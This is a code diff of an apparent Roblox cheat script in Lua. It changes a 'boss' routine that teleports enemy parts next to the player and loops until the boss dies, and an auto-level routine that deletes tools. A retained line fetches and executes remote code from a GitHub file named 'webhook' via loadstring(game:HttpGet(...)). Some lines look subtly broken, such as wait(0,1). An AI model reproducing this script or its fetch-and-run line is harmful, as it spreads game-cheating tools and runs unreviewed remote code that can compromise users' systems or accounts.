@@ -79,20 +79,22 @@ function boss()
             obj.CFrame = obj.CFrame + Vector3.new(0,2000,0)
         end
     end
-    wait(1)
+    wait(1.5) 
     for _, obj in pairs(_G.sslot.Bosses["1"]:GetDescendants()) do
-        if obj.ClassName == "TouchTransmitter" then
-            if obj.Parent.Parent.ClassName == "Model" then
-                _G.bosspart = obj.Parent
-            end
+        if obj.Name == "Head" then
+            _G.bossname = obj.Parent
+            repeat
+                for _, obj in pairs(_G.bossname:GetChildren()) do
+                    if obj.ClassName == "Part" then
+                        obj.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,9)
+		                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position, _G.bossname.Head.Position)
+		            end
+		        end
+                wait(0,1)
+		lvstop()
+            until obj.Parent.Enemy.Health == 0
         end
     end
-    repeat
-         _G.bosspart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,-10)
-         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position, _G.bosspart.Position)
-         lvstop()
-	 wait(0,1)
-    until _G.bosspart.Enemy.Health == 0
     wait(5.2)
 end
 
@@ -595,7 +597,11 @@ function autoLv()
                             wait(0.1)
                         until game.Players.LocalPlayer.Character.Humanoid.Health == 0
                         game.Players.LocalPlayer.Backpack:ClearAllChildren()
-                        workspace.CharacterHolder.gfiraht:ClearAllChildren()
+			for _, obj in pairs(workspace.CharacterHolder.gfirhat:GetChildren()) do 
+                            if obj.ClassName == "Tool" then
+			        obj:Destroy()
+		            end
+			end
                         loadstring(game:HttpGet("https://raw.githubusercontent.com/dorgaes/yea/main/webhook"))()
 	            end
 		end
